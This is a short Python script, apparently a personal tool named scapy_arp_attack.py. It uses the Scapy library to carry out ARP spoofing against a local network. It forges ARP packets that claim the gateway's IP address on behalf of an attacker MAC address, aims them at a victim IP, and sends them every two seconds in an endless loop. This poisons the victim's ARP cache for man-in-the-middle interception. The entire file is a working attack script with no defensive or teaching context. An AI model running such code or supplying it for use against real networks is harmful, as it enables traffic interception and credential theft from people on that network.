# coding:utf-8
"""
@file: scapy_arp_attack.py
@time: 11/19/2019 10:53 PM
@contact: dabuwang
"""

from scapy.all import *
import time

op=1 # Op code 1 for query arp
victim="<victim_ip>" # replace with the victim's IP
spoof="<ip_gateway>" # replace with the IP of the gateway
mac="<attack_mac_address>" # replace with the attacker's MAC address

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while True:
    send(arp)
    time.sleep(2)